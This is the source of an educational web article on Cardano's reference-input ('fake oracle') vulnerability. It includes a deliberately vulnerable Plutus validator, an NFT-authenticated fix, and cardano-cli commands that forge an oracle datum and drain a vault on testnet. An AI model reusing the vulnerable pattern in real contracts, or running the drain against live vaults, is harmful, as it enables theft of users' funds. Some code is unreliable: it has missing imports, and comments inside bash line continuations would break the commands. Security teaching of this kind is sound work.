import CodeBlock from "@/components/layouts/CodeBlock";

export const articleMeta = {
    id: "refinputmisuse",
    title: "Reference Input Misuse (Fake Oracle)",
    subtitle: "A vulnerability where a smart contract reads external data without verifying the source",
    date: "2025-02-25T15:00:00.000Z",
    readTime: "9 min read",
    tags: ["plutus", "cardano", "security", "exploit", "expert"],
    author: {
        name: "Aman Kumar",
        avatar: "https://i.pravatar.cc/48?img=21",
    },
    plutusVersion: "V2",
    complexity: "Expert",
    useCase: "Security",
};

export default function RefInputMisuseArticle() {
    const haskellCode = `{-# LANGUAGE DataKinds           #-}
{-# LANGUAGE ImportQualifiedPost #-}
{-# LANGUAGE NoImplicitPrelude   #-}
{-# LANGUAGE OverloadedStrings   #-}
{-# LANGUAGE TemplateHaskell     #-}

module RefInputMisuse where

import qualified Plutus.V2.Ledger.Api as PlutusV2
import           PlutusTx             (BuiltinData, compile, unstableMakeIsData)
import           PlutusTx.Prelude     (Bool, traceIfFalse, (&&), ($), (==), (>=))
import           Plutus.V1.Ledger.Value (valueOf)
import           Prelude              (IO)
import           Utilities            (wrapValidator, writeValidatorToFile)

---------------------------------------------------------------------------------------------------
----------------------------------- ON-CHAIN / VULNERABLE VALIDATOR -------------------------------

-- ❌ VULNERABLE DESIGN ❌
-- This contract relies on an external price feed (An Oracle). 
-- It reads the oracle's reference input, extracts the ADA/USD price from the datum,
-- and allows a user to "liquidate" a vault if ADA crashes below $0.50.

{-# INLINABLE mkVulnerableLiquidation #-}
mkVulnerableLiquidation :: () -> () -> PlutusV2.ScriptContext -> Bool
mkVulnerableLiquidation () () ctx = 
    -- The script searches the Reference Inputs (CIP-31) to find the oracle data.
    -- Wait... how does it know it's looking at the *real* oracle?
    traceIfFalse "ADA price is too high to liquidate!" priceIsCrashing
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    priceIsCrashing :: Bool
    priceIsCrashing =
        let
            -- The script carelessly grabs the VERY FIRST reference input it can find
            -- that successfully decodes into an Integer.
            refInputs = PlutusV2.txInfoReferenceInputs info
            oracleValue = case refInputs of
                (refInfo:_) -> 
                    case PlutusV2.txOutDatum (PlutusV2.txInInfoResolved refInfo) of
                        PlutusV2.OutputDatum (PlutusV2.Datum d) -> PlutusTx.unsafeFromBuiltinData d :: Integer
                        _ -> 1000 -- Fallback to high price if decoding fails
                _ -> 1000 -- Fallback if no reference inputs exist
        in
            -- Condition: Oracle must say ADA is under $0.50 (e.g. integer 50)
            oracleValue < 50


---------------------------------------------------------------------------------------------------
----------------------------------- THE FIX: ORACLE AUTHENTICATION --------------------------------

-- ✅ SECURE DESIGN ✅
-- The script must aggressively audit the reference input's UTxO to prove it was actually
-- created by the true underlying Oracle protocol, usually by demanding an NFT is present.

{-# INLINABLE mkSecureLiquidation #-}
mkSecureLiquidation :: PlutusV2.CurrencySymbol -> () -> () -> PlutusV2.ScriptContext -> Bool
mkSecureLiquidation oracleNFT () () ctx = 
    traceIfFalse "Missing valid oracle reference!" hasValidOracle &&
    traceIfFalse "ADA price is too high to liquidate!" priceIsCrashing
  where
    info :: PlutusV2.TxInfo
    info = PlutusV2.scriptContextTxInfo ctx

    -- We find the *specific* reference input holding the Oracle NFT.
    -- If an attacker provides a fake reference input without this precise CurrencySymbol,
    -- the list comprehension comes up empty and the transaction crashes.
    validOracleUTxO :: [PlutusV2.TxOut]
    validOracleUTxO = [ PlutusV2.txInInfoResolved r | r <- PlutusV2.txInfoReferenceInputs info
                                                    , valueOf (PlutusV2.txOutValue (PlutusV2.txInInfoResolved r)) oracleNFT "" >= 1 ]

    hasValidOracle :: Bool
    hasValidOracle = length validOracleUTxO == 1

    priceIsCrashing :: Bool
    priceIsCrashing =
        case validOracleUTxO of
            [out] -> case PlutusV2.txOutDatum out of
                PlutusV2.OutputDatum (PlutusV2.Datum d) -> (PlutusTx.unsafeFromBuiltinData d :: Integer) < 50
                _ -> False
            _ -> False

    length :: [a] -> Integer
    length []     = 0
    length (_:xs) = 1 + length xs

{-# INLINABLE wrappedVulnVal #-}
wrappedVulnVal :: BuiltinData -> BuiltinData -> BuiltinData -> ()
wrappedVulnVal = wrapValidator mkVulnerableLiquidation

validator :: PlutusV2.Validator
validator =
  PlutusV2.mkValidatorScript
    $$(PlutusTx.compile [|| wrappedVulnVal ||])
`;

    const bashCommands = `# Scenario: A massive Vault of ADA is protected by a Liquidation contract.
# It can only be cracked open if a trusted Oracle reports the price is < $0.50.
# The real ADA price is currently $1.20.

# -------------------------------------------------------------------------
# THE SETUP: Counterfeiting the Oracle
# The hacker doesn't hack the Oracle. The hacker just creates their OWN Oracle.
# They send 2 ADA to their own wallet, and attach a completely arbitrary 
# inline datum stating the number "10", pretending ADA is $0.10.

$ cardano-cli conway transaction build \\
  --tx-in hacker_funds...#0 \\
  --tx-out $(cat hacker.addr)+2000000 \\
  --tx-out-inline-datum-value '{"int":10}' \\   <-- The Poisoned Data
  --change-address $(cat hacker.addr) \\
  --testnet-magic 2 \\
  --out-file tx-setup.raw
# (Sign and submit...) yielding Fake Oracle UTxO: fake_oracle_f29c...#0

# -------------------------------------------------------------------------
# THE EXPLIOT: Reference Input Misuse
# The hacker submits the liquidation transaction against the vault.
# Since the vulnerable contract does not enforce the Oracle's authenticity,
# the hacker simply plugs in their shiny new fake_oracle UTxO using --read-only-tx-in-reference.

$ cardano-cli conway transaction build \\
  --tx-in vault_utxo_d83b...#0 \\
  --tx-in-script-file vulnerable_liquidation.plutus \\
  --tx-in-inline-datum-present \\
  --tx-in-redeemer-value '{"constructor":0,"fields":[]}' \\
  \\
  # ⚠️ THE EXPLOIT: Feeding the poisoned data to the blind script
  --read-only-tx-in-reference fake_oracle_f29c...#0 \\
  \\
  # The hacker drains the entire 500,000 ADA vault because the script evaluates 10 < 50 == True!
  --tx-out $(cat hacker.addr)+500000000000 \\
  --tx-in-collateral hacker_collateral...#0 \\
  --change-address $(cat hacker.addr) \\
  --testnet-magic 2 \\
  --out-file tx-attack.raw

$ cardano-cli conway transaction sign --tx-body-file tx-attack.raw --signing-key-file hacker.skey --testnet-magic 2 --out-file tx-attack.signed
$ cardano-cli conway transaction submit --tx-file tx-attack.signed

# Result:
# The vulnerable contract looks at the list of reference inputs.
# It finds "fake_oracle_f29c...#0". It extracts the datum. It parses the Integer "10".
# It verifies 10 < 50. The vault is liquidated and drained by the attacker.
`;

    return (
        <div className="article-content">
            <h2 id="introduction">Introduction</h2>

            <p>
                Cardano's Vasil (Plutus V2) Hard Fork introduced <strong>Reference Inputs (CIP-31)</strong>. This feature lets smart contracts read data from a UTxO without consuming it. 
            </p>

            <p>
                Before CIP-31, reading an Oracle price feed required spending the Oracle UTxO and immediately recreating it. This caused congestion because multiple dApps competed to spend the same oracle UTxO in the same block.
            </p>

            <CodeBlock
                code={haskellCode}
                language="haskell"
                filename="RefInputMisuse.hs"
            />
            <br />

            <h2 id="explanation">The Vulnerability Explained</h2>

            <h3>The Blind Oracle</h3>

            <p className="pexplaination">
                While Reference Inputs solved congestion, they introduced a significant logical vulnerability: <strong>Trusting the Sender</strong>. 
            </p>

            <p className="pexplaination pt-2">
                When a user interacts with a smart contract, the user is the one constructing the entire transaction offline. The user decides exactly what inputs to consume, what outputs to create, and <i>exactly which Reference Inputs to attach</i>. 
            </p>

            <p className="pexplaination pt-2">
                If your smart contract reads <code>PlutusV2.txInfoReferenceInputs</code> and extracts the datum from whichever UTxO is there, you've opened the door to exploitation. An attacker doesn't need to compromise the real Charli3 or Orcfax Oracle. They just send an ADA transaction to themselves with an inline datum claiming ADA is worth $0.0001, then pass that UTxO as the reference input.
            </p>

            <h3>The Fix: Cryptographic Badges</h3>

            <CodeBlock
                code={`validOracleUTxO = [ PlutusV2.txInInfoResolved r | r <- PlutusV2.txInfoReferenceInputs info
                                                  , valueOf (PlutusV2.txOutValue (...)) oracleNFT >= 1 ]

hasValidOracle = length validOracleUTxO == 1`}
                language="haskell"
                filename="Authenticating the Datasource"
            />

            <p className="pexplaination pt-2">
                The fix is straightforward: before reading the datum, the contract must verify the UTxO's authenticity. On Cardano, this is typically done by requiring a specific <strong>NFT</strong> (Non-Fungible Token) to be present in the reference input. 
            </p>

            <p className="pexplaination">
                Real Oracle protocols lock their data inside a UTxO that also contains a unique Authentication Token. The secure validator requires the reference input to contain at least 1 token matching the hardcoded `oracleNFT` Policy ID. Since an attacker can't forge the Oracle's minting policy, they can't produce a valid fake.
            </p>

            <br />

            <h2 id="execution">The Attacker's CLI Lifecycle</h2>

            <p className="pexplaination">
                With a vulnerable contract, the exploit requires absolutely zero reverse engineering of complex Haskell logic. The vulnerability is entirely in the mechanical injection of arbitrary state via the <code>--read-only-tx-in-reference</code> flag, bypassing all logic gates that relied on the data.
            </p>

            <CodeBlock
                code={bashCommands}
                language="bash"
                filename="The Fake Oracle Exploit"
            />

        </div>
    );
}
